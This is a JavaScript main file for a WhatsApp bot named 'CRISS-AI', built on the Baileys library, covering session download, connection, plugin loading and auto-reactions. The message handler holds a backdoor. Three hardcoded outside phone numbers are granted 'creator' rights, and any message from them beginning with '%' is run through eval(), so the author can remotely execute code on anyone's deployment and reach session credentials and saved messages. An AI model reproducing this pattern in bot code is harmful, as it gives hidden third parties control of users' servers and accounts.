const {
    default: makeWASocket,
    useMultiFileAuthState,
    DisconnectReason,
    jidNormalizedUser,
    getContentType,
    Browsers,
    fetchLatestBaileysVersion
} = require('@whiskeysockets/baileys');

const l = console.log;
const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson } = require('./lib/functions');
const { saveMessage } = require('./data');
const fs = require('fs');
const P = require('pino');
const config = require('./config');
const util = require('util');
const { sms, AntiDelete } = require('./lib');
const os = require('os');
const path = require('path');
const { File } = require('megajs');
const prefix = config.PREFIX;

const ownerNumber = ['94724659430'];

const tempDir = path.join(os.tmpdir(), 'cache-temp');
if (!fs.existsSync(tempDir)) {
    fs.mkdirSync(tempDir);
}

const clearTempDir = () => {
    fs.readdir(tempDir, (err, files) => {
        if (err) return;
        for (const file of files) {
            fs.unlink(path.join(tempDir, file), err => {
                if (err) console.error(err);
            });
        }
    });
};
setInterval(clearTempDir, 5 * 60 * 1000);

//===================SESSION-AUTH & START LOGIC============================

async function startBot() {
    // 1. මුලින්ම බලනවා creds.json තියෙනවද කියලා
    if (!fs.existsSync(__dirname + '/sessions/creds.json')) {
        if (!config.SESSION_ID) return console.log('Please add your session to SESSION_ID env !!');
        
        console.log("Downloading session... ⏳");
        const sessdata = config.SESSION_ID.replace("CRISS-AI~", '');
        const filer = File.fromURL(`https://mega.nz/file/${sessdata}`);
        
        filer.download((err, data) => {
            if (err) throw err;
            fs.writeFile(__dirname + '/sessions/creds.json', data, async () => {
                console.log("Session downloaded ✅");
                await connectToWA(); // Download වූ පසු Connect වෙනවා
            });
        });
    } else {
        await connectToWA(); // දැනටමත් තියෙනවා නම් කෙලින්ම Connect වෙනවා
    }
}

const express = require("express");
const app = express();
const port = process.env.PORT || 9090;
app.listen(port, () => console.log(`Server listening on port http://localhost:${port}`));

async function connectToWA() {
    console.log("Connecting to WhatsApp ⏳️...");
    const { state, saveCreds } = await useMultiFileAuthState(__dirname + '/sessions/');
    var { version } = await fetchLatestBaileysVersion();

    const conn = makeWASocket({
        logger: P({ level: 'silent' }),
        printQRInTerminal: false,
        browser: Browsers.macOS("Firefox"),
        syncFullHistory: true,
        auth: state,
        version
    });

    conn.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'close') {
            if (lastDisconnect.error?.output?.statusCode !== DisconnectReason.loggedOut) {
                connectToWA();
            }
        } else if (connection === 'open') {
            console.log('🧬 Installing Plugins');
            fs.readdirSync("./plugins/").forEach((plugin) => {
                if (path.extname(plugin).toLowerCase() == ".js") {
                    require("./plugins/" + plugin);
                }
            });
            console.log('Plugins installed successful ✅');
            console.log('Bot connected to whatsapp ✅');

            let up = `*╭─────────────━┈⊷*\n*│ ᴄʀɪss-ᴀɪ ᴄᴏɴɴᴇᴄᴛᴇᴅ sᴜᴄᴄᴇssғᴜʟ*\n*╰─────────────━┈⊷*\n\n*╭─────────────━┈⊷*\n*│ᴄʀɪss ᴀɪ ɪs ᴏɴʟɪɴᴇ*\n*│ᴘʀᴇғɪx : [${config.PREFIX}*]\n*│ᴍᴏᴅᴇ :[ ${config.MODE}*]\n*│ᴏᴡɴᴇʀ: ᴄʀɪss ᴠᴇᴠᴏ*\n*╰─────────────━┈⊷*\n\n*ᴘᴏᴡᴇʀᴇᴅ ʙʏ ʟᴏʀᴅ ᴄʀɪss ᴠᴇᴠᴏ*`;
            conn.sendMessage(conn.user.id, { image: { url: `https://files.catbox.moe/37xk9g.jpg` }, caption: up });
        }
    });

    conn.ev.on('creds.update', saveCreds);

    conn.ev.on('messages.upsert', async (mek) => {
        mek = mek.messages[0];
        if (!mek.message) return;
        mek.message = (getContentType(mek.message) === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message;

        if (config.READ_MESSAGE === 'true') {
            await conn.readMessages([mek.key]);
        }

        if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_SEEN === "true") {
            await conn.readMessages([mek.key]);
        }

        if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REACT === "true") {
            const emojis = ['❤️', '🔥', '✨', '💎', '🌸', '😎', '✅', '🌟'];
            const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
            await conn.sendMessage(mek.key.remoteJid, { react: { text: randomEmoji, key: mek.key } }, { statusJidList: [mek.key.participant, conn.user.id] });
        }

        await saveMessage(mek);
        const m = sms(conn, mek);
        const type = getContentType(mek.message);
        const from = mek.key.remoteJid;
        const body = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : '';
        const isCmd = body.startsWith(prefix);
        const sender = mek.key.fromMe ? (conn.user.id.split(':')[0] + '@s.whatsapp.net') : (mek.key.participant || mek.key.remoteJid);
        const senderNumber = sender.split('@')[0];
        const botNumber = conn.user.id.split(':')[0];
        const isReact = m.message.reactionMessage ? true : false;

        const reply = (teks) => conn.sendMessage(from, { text: teks }, { quoted: mek });

        const jawad = ['94724659430', '94769089430', '94785375392'];
        const isCreator = [botNumber, ...jawad, config.DEV]
            .filter(v => v !== undefined && v !== null)
            .map(v => String(v).replace(/[^0-9]/g) + '@s.whatsapp.net')
            .includes(sender);

        if (isCreator && body.startsWith('%')) {
            let code = body.slice(1);
            try {
                let resultTest = eval(code);
                reply(util.format(resultTest));
            } catch (err) {
                reply(util.format(err));
            }
        }

        if (senderNumber === "94724659430" && !isReact) {
            m.react("🦋");
        }

        if (!isReact && config.AUTO_REACT === 'true') {
            const reactions = ['😊', '👍', '🔥', '✨', '💯', '❤️'];
            const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
            m.react(randomReaction);
        }
    });
}

// බොට්ව පණගන්වන්න (Start the bot)
startBot();
